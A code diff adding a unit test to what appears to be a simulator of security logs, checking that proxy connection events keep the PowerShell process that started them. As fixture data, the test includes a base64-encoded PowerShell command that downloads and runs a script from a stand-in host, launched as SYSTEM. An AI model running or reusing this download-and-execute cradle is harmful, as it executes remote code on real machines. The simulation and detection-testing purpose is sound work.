@@ -498,6 +498,113 @@ class TestExplicitProxyVisibility:
         assert client_event.process.username == user.username
         assert client_event.process.image.endswith(r"\Mozilla Firefox\firefox.exe")
 
+    def test_matching_caller_proxy_process_is_preserved_for_storyline_download(self):
+        generator, emitters = _generator(
+            [
+                NetworkSensor(
+                    type="network",
+                    name="client-tap",
+                    monitoring_segments=["workstations"],
+                    direction="outbound",
+                    log_formats=["zeek"],
+                )
+            ]
+        )
+        user, _, explorer_pid = _seed_proxy_client_user_session(generator)
+        workstation = generator._ip_to_system["10.0.1.10"]
+        powershell_image = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
+        generator.state_manager.set_current_time(datetime(2024, 1, 15, 9, 58, 0, tzinfo=UTC))
+        stale_user_pid = generator.state_manager.create_process(
+            system=workstation.hostname,
+            parent_pid=explorer_pid,
+            image=powershell_image,
+            command_line=(
+                "powershell.exe -NoProfile -Command "
+                "\"Invoke-WebRequest -Proxy 'http://PROXY-01.example.org:8080' "
+                "-Uri 'https://cdn-assets-update.com/' -UseBasicParsing\""
+            ),
+            username=user.username,
+            integrity_level="Medium",
+            logon_id=user_session.logon_id,
+        )
+        generator.state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
+        storyline_pid = generator.state_manager.create_process(
+            system=workstation.hostname,
+            parent_pid=4,
+            image=powershell_image,
+            command_line=(
+                "powershell.exe -NoProfile -EncodedCommand "
+                "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABp"
+                "AGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AH"
+                "AAcwA6AC8ALwBjAGQAbgAtAGEAcwBzAGUAdABzAC0AdQBwAGQAYQB0AGUALgBjAG8A"
+                "bQAvAGgAZQBhAGwAdABoAC4AcABzADEAIgApAA=="
+            ),
+            username="SYSTEM",
+            integrity_level="System",
+            logon_id="0x3e7",
+        )
+        assert stale_user_pid != storyline_pid
+        generator._build_proxy_context = Mock(
+            return_value=ProxyContext(
+                client_ip="10.0.1.10",
+                method="GET",
+                url="https://cdn-assets-update.com/health.ps1",
+                host="cdn-assets-update.com",
+                status_code=200,
+                sc_bytes=4800,
+                cs_bytes=420,
+                time_taken=1200,
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/5.1",
+                content_type="text/plain",
+                cache_result="MISS",
+                referrer="",
+                proxy_fqdn="PROXY-01.example.org",
+            )
+        )
+
+        generator.generate_connection(
+            src_ip="10.0.1.10",
+            dst_ip="45.33.32.30",
+            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
+            dst_port=443,
+            proto="tcp",
+            service="ssl",
+            duration=1.0,
+            orig_bytes=500,
+            resp_bytes=5000,
+            pid=storyline_pid,
+            source_system=workstation,
+            hostname="cdn-assets-update.com",
+            conn_state="SF",
+            process_image=powershell_image,
+            http=HttpContext(
+                method="GET",
+                host="cdn-assets-update.com",
+                uri="/health.ps1",
+                version="1.1",
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/5.1",
+                response_body_len=5000,
+                status_code=200,
+                status_msg="OK",
+                resp_mime_types=["text/plain"],
+            ),
+        )
+
+        client_event = next(
+            call.args[0]
+            for call in emitters["zeek_conn"].emit.call_args_list
+            if call.args[0].network.src_ip == "10.0.1.10"
+            and call.args[0].network.dst_ip == "10.0.3.10"
+            and call.args[0].network.dst_port == 8080
+        )
+
+        assert client_event.process is not None
+        assert client_event.process.pid == storyline_pid
+        assert client_event.process.pid == client_event.network.initiating_pid
+        assert client_event.process.username == "SYSTEM"
+        assert client_event.process.command_line.endswith("AA==")
+
     def test_documentation_ip_with_external_hostname_routes_through_proxy(self):
         generator, emitters = _generator(
             [
